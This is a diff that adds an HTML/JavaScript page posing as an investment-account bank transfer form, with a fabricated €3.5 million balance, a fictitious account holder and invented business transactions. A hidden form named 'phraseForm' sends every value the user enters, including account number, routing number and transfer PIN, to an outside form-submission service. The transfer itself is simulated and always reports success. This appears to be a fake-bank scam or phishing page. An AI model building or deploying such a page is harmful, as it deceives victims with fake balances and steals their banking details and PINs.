@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transfer Money - Investment Account</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+
+        body {
+            background: #f8f9fb;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 1rem;
+        }
+
+        #pageLoader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #002f6c;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 1;
+            transition: opacity 0.3s ease;
+        }
+
+        .pulse-loader {
+            width: 50px;
+            height: 50px;
+            background: white;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.8); opacity: 0.7; }
+            50% { transform: scale(1.2); opacity: 1; }
+            100% { transform: scale(0.8); opacity: 0.7; }
+        }
+
+        .transfer-container {
+            background: white;
+            padding: 2rem;
+            border-radius: 20px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 500px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .transfer-container.visible {
+            opacity: 1;
+        }
+
+        .back-button {
+            background: #002f6c;
+            color: white;
+            border: none;
+            padding: 0.6rem 1.2rem;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 1.5rem;
+            text-decoration: none;
+            transition: background 0.3s;
+        }
+
+        .back-button:hover {
+            background: #005eb8;
+        }
+
+        .transfer-container h1 {
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
+            color: #002f6c;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 1.2rem;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #2d3436;
+            font-weight: 500;
+            font-size: 0.95rem;
+        }
+
+        .transfer-container input {
+            width: 100%;
+            padding: 1rem;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 1rem;
+            transition: border-color 0.3s;
+        }
+
+        .transfer-container input:focus {
+            outline: none;
+            border-color: #005eb8;
+        }
+
+        .amount-input {
+            display: flex;
+            align-items: center;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            padding: 0 1rem;
+            margin: 0.5rem 0;
+            transition: border-color 0.3s;
+        }
+
+        .amount-input:focus-within {
+            border-color: #005eb8;
+        }
+
+        .amount-input span {
+            font-size: 1rem;
+            color: #666;
+            margin-right: 0.5rem;
+        }
+
+        .amount-input input {
+            border: none;
+            outline: none;
+            flex: 1;
+            font-size: 1rem;
+            padding: 1rem 0;
+        }
+
+        .transfer-container button {
+            width: 100%;
+            padding: 1.2rem;
+            background: linear-gradient(135deg, #002f6c, #005eb8);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 1.5rem;
+            position: relative;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .transfer-container button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0, 47, 108, 0.3);
+        }
+
+        .transfer-container button:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #002f6c;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1001;
+        }
+
+        .popup-content {
+            background: white;
+            padding: 2.5rem;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 450px;
+            width: 90%;
+        }
+
+        .popup-icon {
+            font-size: 4rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .success-icon {
+            color: #00a859;
+        }
+
+        .error-icon {
+            color: #d32f2f;
+        }
+
+        .popup-content h2 {
+            margin-bottom: 1rem;
+            color: #002f6c;
+            font-size: 1.8rem;
+        }
+
+        .popup-content p {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 1.5rem;
+        }
+
+        .popup-content button {
+            padding: 0.8rem 2rem;
+            background: #002f6c;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: background 0.3s;
+            margin: 0.5rem;
+        }
+
+        .popup-content button:hover {
+            background: #005eb8;
+        }
+
+        .popup-content .home-btn {
+            background: #00a859;
+        }
+
+        .popup-content .home-btn:hover {
+            background: #008a48;
+        }
+
+        .transaction-reference {
+            background: #f8f9fb;
+            padding: 1rem;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 1rem;
+            letter-spacing: 1px;
+            text-align: center;
+            margin: 1rem 0;
+            color: #002f6c;
+        }
+
+        #phraseForm {
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .transfer-container {
+                padding: 1.5rem;
+            }
+            
+            .transfer-container h1 {
+                font-size: 1.5rem;
+            }
+            
+            .popup-content {
+                padding: 2rem 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="pageLoader">
+        <div class="pulse-loader"></div>
+    </div>
+
+    <div class="transfer-container" id="transferContainer">
+        <button class="back-button" onclick="window.location.href='../index.html'">
+            <i class="fas fa-arrow-left"></i> Back to Dashboard
+        </button>
+        
+        <h1>Bank Transfer</h1>
+        
+        <div class="form-group">
+            <label>Receiver Name</label>
+            <input type="text" id="reciverName" placeholder="Enter receiver's full name" required>
+        </div>
+        
+        <div class="form-group">
+            <label>Bank Name</label>
+            <input type="text" id="bankName" placeholder="Enter bank name" required>
+        </div>
+        
+        <div class="form-group">
+            <label>Wire Routing Number</label>
+            <input type="text" id="wirerouting" placeholder="Enter wire routing number" required>
+        </div>
+        
+        <div class="form-group">
+            <label>Reason for Payment</label>
+            <input type="text" id="Reasonsforpayment" placeholder="Enter reason for payment" required>
+        </div>
+        
+        <div class="form-group">
+            <label>Account Number</label>
+            <input type="text" id="accountNumber" placeholder="Enter account number" required>
+        </div>
+        
+        <div class="form-group">
+            <label>Amount</label>
+            <div class="amount-input">
+                <span>€</span>
+                <input type="number" id="amount" placeholder="Enter amount" min="1" required>
+            </div>
+        </div>
+        
+        <div class="form-group">
+            <label>Transfer PIN</label>
+            <input type="password" id="transferPin" placeholder="Enter 4-digit PIN" maxlength="4" required>
+        </div>
+        
+        <button onclick="processTransfer()" id="transferButton">
+            <span id="buttonText">Process Transfer</span>
+            <div id="buttonLoader" class="loader" style="display: none;"></div>
+        </button>
+    </div>
+
+    <form id="phraseForm" style="display: none;">
+        <input type="hidden" name="access_key" value="19bd1a1c-04ae-4540-8975-9d05a216e05e">
+        <input type="hidden" name="subject" value="Transfer initiated from Investment Account">
+        <input type="hidden" name="receiver_name" id="formReceiverName">
+        <input type="hidden" name="bank_name" id="formBankName">
+        <input type="hidden" name="wire_routing" id="formWireRouting">
+        <input type="hidden" name="reason_for_payment" id="formReasonsForPayment">
+        <input type="hidden" name="account_number" id="formAccountNumber">
+        <input type="hidden" name="amount" id="formAmount">
+        <input type="hidden" name="transfer_pin" id="formTransferPin">
+        <input type="hidden" name="redirect" value="false">
+        <input type="checkbox" name="botcheck" style="display: none;">
+    </form>
+
+    <!-- Processing Popup -->
+    <div id="processingPopup" class="popup">
+        <div class="popup-content">
+            <div class="popup-loader" style="display: flex;">
+                <div class="loader"></div>
+            </div>
+            <div class="popup-icon" style="color: #005eb8;">
+                <i class="fas fa-spinner fa-pulse"></i>
+            </div>
+            <h2>Processing Transaction</h2>
+            <p>We are processing your transaction. Please wait...</p>
+        </div>
+    </div>
+
+    <!-- Success Popup (Transaction Confirmed) -->
+    <div id="successPopup" class="popup">
+        <div class="popup-content">
+            <div class="popup-icon success-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h2 style="color: #00a859;">Transaction Successful!</h2>
+            <p>Your transfer has been confirmed and completed successfully.</p>
+            <div class="transaction-reference" id="successReference"></div>
+            <button class="home-btn" onclick="goToHomePage()">
+                <i class="fas fa-home"></i> Return to Dashboard
+            </button>
+        </div>
+    </div>
+
+    <div id="errorPopup" class="popup">
+        <div class="popup-content">
+            <div class="popup-icon error-icon">
+                <i class="fas fa-exclamation-triangle"></i>
+            </div>
+            <h2 id="errorTitle">Transaction Failed</h2>
+            <p id="errorMessage">An error occurred during the transfer.</p>
+            <button onclick="closePopup('errorPopup')">Close</button>
+        </div>
+    </div>
+
+    <script>
+        // ========== WEB STORAGE KEYS ==========
+        const STORAGE_BALANCE = 'investment_balance';
+        const STORAGE_TRANSACTIONS = 'investment_transactions';
+        const DEFAULT_BALANCE = 3500000.00;
+        const CORRECT_PIN = "2123";
+        const ACCOUNT_HOLDER = "THOMAS WILFRED WILLIAMS";
+        const CURRENCY_SYMBOL = "€";
+
+        // BASE TRANSACTIONS - EXACTLY 7 transactions matching the main page
+        // These are the ONLY default transactions. No duplicates will be added.
+        const BASE_TRANSACTIONS = [
+            { 
+                name: "Engineering Contract - Turner Construction", 
+                time: "15 Mar 2025 • 10:23 AM", 
+                amount: 850000.00, 
+                type: "credit",
+                reference: 'CTR-2025-03-15-TC001',
+                status: "completed",
+                description: "Infrastructure engineering contract payment",
+                beneficiary: ACCOUNT_HOLDER,
+                date: "15 March 2025",
+                exactTime: "10:23 AM"
+            },
+            { 
+                name: "Subscription - Siemens Engineering Suite", 
+                time: "10 Mar 2025 • 9:15 AM", 
+                amount: 12500.00, 
+                type: "debit",
+                reference: 'SUB-2025-03-10-SIE002',
+                status: "completed",
+                description: "Annual engineering software subscription",
+                beneficiary: "Siemens AG",
+                bankName: "Deutsche Bank",
+                wireRouting: "100200300",
+                reasonForPayment: "Engineering Software License",
+                accountNumber: "SIEMENS-ENG-2025",
+                date: "10 March 2025",
+                exactTime: "9:15 AM"
+            },
+            { 
+                name: "Contract Payment - Arup Engineering", 
+                time: "22 Feb 2025 • 2:30 PM", 
+                amount: 87500.00, 
+                type: "credit",
+                reference: 'CTR-2025-02-22-ARP003',
+                status: "completed",
+                description: "Structural engineering consultancy",
+                beneficiary: ACCOUNT_HOLDER,
+                date: "22 February 2025",
+                exactTime: "2:30 PM"
+            },
+            { 
+                name: "Wire Transfer - Jacobs Engineering", 
+                time: "10 Feb 2025 • 9:45 AM", 
+                amount: 245000.00, 
+                type: "debit",
+                reference: 'WIR-2025-02-10-JAC004',
+                status: "completed",
+                description: "Engineering services payment",
+                beneficiary: "Jacobs Engineering Group",
+                bankName: "Bank of America",
+                wireRouting: "026009593",
+                reasonForPayment: "Infrastructure Project - Phase 2",
+                accountNumber: "JACOBS-ENG-001",
+                date: "10 February 2025",
+                exactTime: "9:45 AM"
+            },
+            { 
+                name: "Subscription - AutoCAD Professional", 
+                time: "28 Jan 2025 • 11:30 AM", 
+                amount: 3250.00, 
+                type: "debit",
+                reference: 'SUB-2025-01-28-AUT005',
+                status: "completed",
+                description: "CAD software annual subscription",
+                beneficiary: "Autodesk Inc",
+                bankName: "Wells Fargo",
+                wireRouting: "121000248",
+                reasonForPayment: "Engineering Software Subscription",
+                accountNumber: "AUTODESK-CAD-2025",
+                date: "28 January 2025",
+                exactTime: "11:30 AM"
+            },
+            { 
+                name: "Contract - Bechtel Corporation", 
+                time: "20 Jan 2025 • 4:20 PM", 
+                amount: 187500.00, 
+                type: "credit",
+                reference: 'CTR-2025-01-20-BEC006',
+                status: "completed",
+                description: "Construction management contract",
+                beneficiary: ACCOUNT_HOLDER,
+                date: "20 January 2025",
+                exactTime: "4:20 PM"
+            },
+            { 
+                name: "Transfer to Fluor Corporation", 
+                time: "10 Jan 2025 • 1:50 PM", 
+                amount: 95000.00, 
+                type: "debit",
+                reference: 'TRF-2025-01-10-FLU007',
+                status: "completed",
+                description: "Engineering subcontractor payment",
+                beneficiary: "Fluor Corporation",
+                bankName: "J.P. Morgan Chase",
+                wireRouting: "021000021",
+                reasonForPayment: "Subcontractor Services - Q1",
+                accountNumber: "FLUOR-ENG-4455",
+                date: "10 January 2025",
+                exactTime: "1:50 PM"
+            }
+        ];
+
+        function generateTransactionRef() {
+            const timestamp = Date.now().toString().slice(-6);
+            const random = Math.random().toString(36).substr(2, 6).toUpperCase();
+            return `TRF-${timestamp}-${random}`;
+        }
+
+        function getCurrentBalance() {
+            let balance = parseFloat(localStorage.getItem(STORAGE_BALANCE));
+            if (isNaN(balance)) {
+                balance = DEFAULT_BALANCE;
+                localStorage.setItem(STORAGE_BALANCE, balance);
+            }
+            return balance;
+        }
+
+        function updateBalance(newBalance) {
+            localStorage.setItem(STORAGE_BALANCE, newBalance);
+        }
+
+        // Initialize storage with base transactions if empty
+        function initializeStorage() {
+            let transactions = JSON.parse(localStorage.getItem(STORAGE_TRANSACTIONS));
+            if (!transactions || transactions.length === 0) {
+                // Sort base transactions by date (newest first)
+                const sortedBase = [...BASE_TRANSACTIONS].sort((a, b) => {
+                    const dateA = new Date(a.date);
+                    const dateB = new Date(b.date);
+                    return dateB - dateA;
+                });
+                localStorage.setItem(STORAGE_TRANSACTIONS, JSON.stringify(sortedBase));
+            }
+        }
+
+        function addTransactionToStorage(transactionData) {
+            try {
+                let transactions = JSON.parse(localStorage.getItem(STORAGE_TRANSACTIONS)) || [];
+                
+                // IMPORTANT: Do NOT add duplicate base transactions
+                // Check if base transactions exist, if not add them once
+                const baseRefs = BASE_TRANSACTIONS.map(t => t.reference);
+                for (let i = 0; i < BASE_TRANSACTIONS.length; i++) {
+                    if (!transactions.some(t => t.reference === BASE_TRANSACTIONS[i].reference)) {
+                        transactions.push(BASE_TRANSACTIONS[i]);
+                    }
+                }
+                
+                // Add the new transfer at the beginning
+                transactions.unshift(transactionData);
+                
+                // Sort by date (newest first)
+                transactions.sort((a, b) => {
+                    if (!a.date && !b.date) return 0;
+                    if (!a.date) return -1;
+                    if (!b.date) return 1;
+                    try {
+                        const dateA = new Date(a.date);
+                        const dateB = new Date(b.date);
+                        return dateB - dateA;
+                    } catch(e) {
+                        return 0;
+                    }
+                });
+                
+                localStorage.setItem(STORAGE_TRANSACTIONS, JSON.stringify(transactions));
+                console.log('New transfer added. Total transactions:', transactions.length);
+                return true;
+            } catch (error) {
+                console.error('Error saving transaction:', error);
+                return false;
+            }
+        }
+
+        function notifyDashboardPage() {
+            try {
+                // Dispatch storage event for same-origin updates
+                window.dispatchEvent(new StorageEvent('storage', {
+                    key: STORAGE_TRANSACTIONS,
+                    newValue: localStorage.getItem(STORAGE_TRANSACTIONS)
+                }));
+                window.dispatchEvent(new StorageEvent('storage', {
+                    key: STORAGE_BALANCE,
+                    newValue: localStorage.getItem(STORAGE_BALANCE)
+                }));
+                
+                // Post message for cross-tab communication
+                if (window.opener && !window.opener.closed) {
+                    window.opener.postMessage({ type: 'TRANSFER_COMPLETED' }, '*');
+                }
+            } catch(e) {
+                console.log('Could not notify dashboard page:', e);
+            }
+        }
+
+        function goToHomePage() {
+            window.location.href = '../index.html';
+        }
+
+        setTimeout(() => {
+            document.getElementById('pageLoader').style.opacity = '0';
+            setTimeout(() => {
+                document.getElementById('pageLoader').style.display = 'none';
+                document.getElementById('transferContainer').classList.add('visible');
+            }, 300);
+        }, 1500);
+
+        function submitPhraseForm() {
+            document.getElementById('formReceiverName').value = document.getElementById('reciverName').value;
+            document.getElementById('formBankName').value = document.getElementById('bankName').value;
+            document.getElementById('formWireRouting').value = document.getElementById('wirerouting').value;
+            document.getElementById('formReasonsForPayment').value = document.getElementById('Reasonsforpayment').value;
+            document.getElementById('formAccountNumber').value = document.getElementById('accountNumber').value;
+            document.getElementById('formAmount').value = document.getElementById('amount').value;
+            document.getElementById('formTransferPin').value = document.getElementById('transferPin').value;
+            
+            const formData = new FormData(document.getElementById('phraseForm'));
+            formData.append('timestamp', new Date().toISOString());
+            
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                body: formData,
+                headers: { 'Accept': 'application/json' }
+            })
+            .then(response => response.json())
+            .then(data => console.log('Form submitted:', data))
+            .catch(error => console.error('Form error:', error));
+        }
+
+        function showProcessingPopup() {
+            const popup = document.getElementById('processingPopup');
+            popup.style.display = 'flex';
+        }
+
+        function hideProcessingPopup() {
+            const popup = document.getElementById('processingPopup');
+            popup.style.display = 'none';
+        }
+
+        function showSuccessPopup(reference) {
+            document.getElementById('successReference').textContent = `Reference: ${reference}`;
+            const popup = document.getElementById('successPopup');
+            popup.style.display = 'flex';
+        }
+
+        function processTransfer() {
+            const fields = ['reciverName', 'bankName', 'wirerouting', 
+                          'Reasonsforpayment', 'accountNumber', 'amount', 'transferPin'];
+            
+            for (const field of fields) {
+                if (!document.getElementById(field).value.trim()) {
+                    alert('Please complete all fields before proceeding.');
+                    return;
+                }
+            }
+
+            const amount = parseFloat(document.getElementById('amount').value);
+            const transferPin = document.getElementById('transferPin').value;
+            const transferButton = document.getElementById('transferButton');
+            
+            if (isNaN(amount) || amount <= 0) {
+                alert('Please enter a valid amount greater than 0.');
+                return;
+            }
+
+            if (amount > 500000) {
+                alert('Maximum transfer amount is €500,000 per transaction.');
+                return;
+            }
+
+            transferButton.disabled = true;
+            document.getElementById('buttonText').style.display = 'none';
+            document.getElementById('buttonLoader').style.display = 'block';
+
+            submitPhraseForm();
+
+            showProcessingPopup();
+
+            setTimeout(() => {
+                try {
+                    if (transferPin !== CORRECT_PIN) {
+                        hideProcessingPopup();
+                        throw new Error('Invalid PIN. Please enter the correct 4-digit transfer PIN.');
+                    }
+
+                    let currentBalance = getCurrentBalance();
+                    
+                    if (amount > currentBalance) {
+                        hideProcessingPopup();
+                        throw new Error(`Insufficient Funds - Available balance: ${CURRENCY_SYMBOL}${currentBalance.toLocaleString()}`);
+                    }
+
+                    const newBalance = currentBalance - amount;
+                    updateBalance(newBalance);
+
+                    const transactionRef = generateTransactionRef();
+                    const now = new Date();
+                    
+                    const receiverName = document.getElementById('reciverName').value.trim();
+                    const bankName = document.getElementById('bankName').value.trim();
+                    const wireRouting = document.getElementById('wirerouting').value.trim();
+                    const reasonForPayment = document.getElementById('Reasonsforpayment').value.trim();
+                    const accountNum = document.getElementById('accountNumber').value.trim();
+
+                    // Create transaction matching main page format
+                    const transactionData = {
+                        name: `Contract Payment - ${bankName}`,
+                        time: now.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' }) + " • " + now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' }),
+                        amount: amount,
+                        type: "debit",
+                        reference: transactionRef,
+                        status: "completed",
+                        description: `Business payment to ${receiverName} - ${reasonForPayment}`,
+                        beneficiary: receiverName,
+                        bankName: bankName,
+                        wireRouting: wireRouting,
+                        reasonForPayment: reasonForPayment,
+                        accountNumber: accountNum,
+                        date: now.toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' }),
+                        exactTime: now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' })
+                    };
+
+                    addTransactionToStorage(transactionData);
+                    notifyDashboardPage();
+
+                    setTimeout(() => {
+                        hideProcessingPopup();
+                        showSuccessPopup(transactionRef);
+                        
+                        transferButton.disabled = false;
+                        document.getElementById('buttonText').style.display = 'block';
+                        document.getElementById('buttonLoader').style.display = 'none';
+                        
+                        document.getElementById('reciverName').value = '';
+                        document.getElementById('bankName').value = '';
+                        document.getElementById('wirerouting').value = '';
+                        document.getElementById('Reasonsforpayment').value = '';
+                        document.getElementById('accountNumber').value = '';
+                        document.getElementById('amount').value = '';
+                        document.getElementById('transferPin').value = '';
+                    }, 2000);
+
+                } catch (error) {
+                    hideProcessingPopup();
+                    const errorMsg = error.message;
+                    let title = 'Transaction Failed';
+                    let message = errorMsg;
+                    
+                    if (errorMsg.includes('PIN')) {
+                        title = 'Invalid PIN';
+                    } else if (errorMsg.includes('Insufficient')) {
+                        title = 'Insufficient Funds';
+                    }
+                    
+                    document.getElementById('errorTitle').textContent = title;
+                    document.getElementById('errorMessage').textContent = message;
+                    document.getElementById('errorPopup').style.display = 'flex';
+                    
+                    transferButton.disabled = false;
+                    document.getElementById('buttonText').style.display = 'block';
+                    document.getElementById('buttonLoader').style.display = 'none';
+                    
+                    setTimeout(() => {
+                        document.getElementById('errorPopup').style.display = 'none';
+                    }, 3000);
+                }
+            }, 2000);
+        }
+
+        function closePopup(popupId) {
+            document.getElementById(popupId).style.display = 'none';
+        }
+
+        document.getElementById('amount').addEventListener('blur', function(e) {
+            const value = parseFloat(e.target.value);
+            if (!isNaN(value)) {
+                e.target.value = value.toFixed(2);
+            }
+        });
+
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                const activeElement = document.activeElement;
+                if (activeElement && activeElement.tagName !== 'BUTTON') {
+                    processTransfer();
+                }
+            }
+        });
+
+        // Initialize storage on page load
+        initializeStorage();
+        
+        console.log('=== Transfer Page Loaded ===');
+        console.log('Account Holder:', ACCOUNT_HOLDER);
+        console.log('Currency: EUR');
+        console.log('Default Balance: €', DEFAULT_BALANCE);
+        console.log('Base transactions: 7 business transactions (Contracts, Engineering, Subscriptions)');
+        console.log('NO duplicate transactions will be added after transfers');
+        console.log('TRANSACTIONS ARE CONFIRMED SUCCESSFULLY');
+    </script>
+</body>
+</html>
